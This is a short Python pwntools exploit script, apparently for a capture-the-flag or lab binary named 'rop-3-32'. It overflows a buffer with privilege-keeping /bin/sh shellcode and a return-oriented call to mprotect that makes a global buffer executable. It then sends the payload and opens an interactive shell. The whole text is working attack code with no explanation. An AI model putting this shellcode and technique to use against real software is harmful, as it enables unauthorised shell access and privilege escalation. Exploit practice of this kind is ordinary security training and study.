#!/usr/bin/env python
from pwn import *

p = process("./rop-3-32")

SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

#    [Shellcode]  	     [buffer-fill]     [saved_ebp]
buf = SHELLCODE + "A"*(0x98-len(SHELLCODE)) + "BBBB" 
#        [mprotect()]         [g_buf]       [g_buf-aligned]   [0x1000]     [7]
buf += p32(0x08048360) + p32(0x0804a060) + p32(0x804a000) + p32(0x1000) + p32(7)

with open('test','wb')as f:
    f.write(buf);

p.sendline(buf)
p.interactive()